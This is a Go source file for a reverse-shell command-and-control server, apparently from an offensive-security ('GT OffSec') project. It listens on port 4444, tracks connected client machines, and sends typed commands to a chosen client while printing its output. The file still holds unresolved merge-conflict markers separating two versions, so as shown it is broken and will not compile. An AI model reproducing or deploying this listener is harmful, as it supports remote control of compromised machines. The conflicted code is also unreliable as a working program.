package main

import (
	"bufio"
	"fmt"
	"net"
	"os"
<<<<<<< HEAD
)

func main() {
	listener, err := net.Listen("tcp", "127.0.0.1:4444")
	if err != nil {
		fmt.Println("Error listening:", err)
		return
	}
	defer listener.Close()

	fmt.Println("Server is listening on 127.0.0.1:4444")

	conn, err := listener.Accept()
	if err != nil {
		fmt.Println("Error accepting connection:", err)
		return
	}
	defer conn.Close()

	reader := bufio.NewReader(os.Stdin)
	for {
		fmt.Print("Enter a command to execute on the client: ")
		command, _ := reader.ReadString('\n')
		command = command[:len(command)-1] // Remove the newline character
		_, err := conn.Write([]byte(command + "\n"))
		if err != nil {
			fmt.Println("Error sending command:", err)
			return
		}

		response, err := bufio.NewReader(conn).ReadString('\n')
		if err != nil {
			fmt.Println("Error receiving response:", err)
			return
		}

		fmt.Println("Client response:")
		fmt.Print(response)
	}
=======
	"strings"
)

type Client struct {
	Name   string
	Socket net.Conn
}

type Server struct {
	IP                   string
	Port                 string
	ServerSocket         net.Listener
	Clients              map[string]*Client
	CurrentClientID      string
	AcceptingConnections bool
	Closing              bool
}

func NewServer(ip, port string) *Server {
	server := &Server{
		IP:                   ip,
		Port:                 port,
		Clients:              make(map[string]*Client),
		CurrentClientID:      "",
		AcceptingConnections: true,
		Closing:              false,
	}
	return server
}

func (s *Server) AcceptConnections() {
	fmt.Println("Accepting connections...")
	fmt.Println("----------------------------------")

	for s.AcceptingConnections {
		sock, err := s.ServerSocket.Accept()
		if err != nil {
			fmt.Println(err)
			fmt.Println("Couldn't accept connection.")
			continue
		}

		if !s.Closing {
			clientName := make([]byte, 1024)
			_, err := sock.Read(clientName)
			if err != nil {
				fmt.Println(err)
				continue
			}
			name := strings.TrimSpace(string(clientName))

			if _, exists := s.Clients[s.CurrentClientID]; !exists {
				s.Clients[s.CurrentClientID] = &Client{Name: name, Socket: sock}
			} else {
				x := 1
				newClientName := name
				for s.Clients[newClientName] != nil {
					newClientName = name + fmt.Sprint(x)
					x++
				}
				s.Clients[newClientName] = &Client{Name: newClientName, Socket: sock}
			}
		}
	}

	fmt.Println("Accepting connections stopped.")
	s.ServerSocket.Close()
}

func (s *Server) Shell() {
	reader := bufio.NewReader(os.Stdin)
	for {
		fmt.Println("")
		if s.CurrentClientID == "" {
			fmt.Print("-> ")
		} else {
			fmt.Print(s.Clients[s.CurrentClientID].Name + "> ")
		}

		command, err := reader.ReadString('\n')
		if err != nil {
			fmt.Println("Error reading input:", err)
			continue
		}

		command = strings.TrimSpace(command)
		parts := strings.SplitAfter(command, " ")

		switch {
		case len(parts) == 2 && parts[0] == "set":
			for i, part := range parts {
				parts[i] = strings.TrimSpace(part)
			}
			s.SetClient(parts[1])

		case command == "unset":
			s.UnsetClient()

		case command == "clients":
			s.ListClients()

		case strings.HasPrefix(command, "pwd") || strings.HasPrefix(command, "ls"):
			s.SendCommand(command)
			s.GetOutput()

		case command == "close" || command == "exit" || command == "quit":
			s.ResetClients()
			s.Exit()
			return

		default:
			if s.SendCommand(command) {
				s.GetOutput()
			} else {
				fmt.Println("Command doesn't exist.")
			}
		}
	}
}

func (s *Server) SetClient(id string) {
	fmt.Println(len(s.Clients))
	if len(s.Clients) > 0 {
		if _, exists := s.Clients[id]; exists {
			fmt.Println(id)
			s.CurrentClientID = id
		} else {
			name := id
			for clientID, client := range s.Clients {
				if name == client.Name {
					s.CurrentClientID = clientID
					name = ""
					break
				}
			}

			if name != "" {
				fmt.Println("Client with this ID or name doesn't exist.")
			}
		}
	} else {
		fmt.Println("No clients connected.")
	}
}

func (s *Server) UnsetClient() {
	s.CurrentClientID = ""
}

func (s *Server) ListClients() {
	if len(s.Clients) > 0 {
		fmt.Println("--------------- Connected clients ---------------")
		fmt.Println("id        name                ip address")
		i := 0
		for _, client := range s.Clients {
			fmt.Printf("%d         %s              %s\n", i, client.Name, client.Socket.RemoteAddr().String())
			i++
		}
	} else {
		fmt.Println("No clients connected.")
	}
}

func (s *Server) SendCommand(command string) bool {
	if s.CurrentClientID != "" {
		client := s.Clients[s.CurrentClientID]
		_, err := client.Socket.Write([]byte(command))
		if err != nil {
			fmt.Println("Client is not connected anymore.")
			s.RemoveClient()
			return false
		}
		return true
	}
	fmt.Println("Some client has to be selected.")
	return false
}

func (s *Server) GetOutput() {
	output := ""
	for {
		data := make([]byte, 1024)
		n, err := s.Clients[s.CurrentClientID].Socket.Read(data)
		if err != nil {
			fmt.Println(err)
			break
		}
		output += string(data[:n])
		if strings.HasSuffix(output, "end") {
			break
		}
	}
	fmt.Println(output[:len(output)-3])
}

func (s *Server) ResetClients() {
	for _, client := range s.Clients {
		_, _ = client.Socket.Write([]byte("close"))
	}
}

func (s *Server) Exit() {
	s.AcceptingConnections = false
	s.Closing = true
	closingSocket, err := net.Dial("tcp", s.IP+":"+s.Port)
	if err != nil {
		fmt.Println(err)
	}
	_ = closingSocket.Close()
	fmt.Println("\nProgram has been closed.")
}

func (s *Server) RemoveClient() {
	delete(s.Clients, s.CurrentClientID)
	s.CurrentClientID = ""
}

func main() {
	banner := `
	   ____________                 
	  / ____/_  __/                 
	 / / __  / /                    
	/ /_/ / / /                     
	\____/ /_/                      
									
	   ____  _____________          
	  / __ \/ __/ __/ ___/___  _____
	 / / / / /_/ /_ \__ \/ _ \/ ___/
	/ /_/ / __/ __/___/ /  __/ /__  
	\____/_/ /_/  /____/\___/\___/  
			`
	red := "\x1b[0;31m"
	reset := "\x1b[0m"

	coloredBanner := red + banner + reset
	fmt.Println(coloredBanner)

	server := NewServer("127.0.0.1", "4444")
	addr := server.IP + ":" + server.Port
	serverSocket, err := net.Listen("tcp", addr)
	if err != nil {
		fmt.Println(err)
		fmt.Println("Couldn't bind and start listening on specified parameters.")
		os.Exit(1)
	}
	server.ServerSocket = serverSocket
	go server.AcceptConnections()
	server.Shell()
>>>>>>> c7c5ee9f97df5b03fcdcb155fde06a784f3ee9ba
}
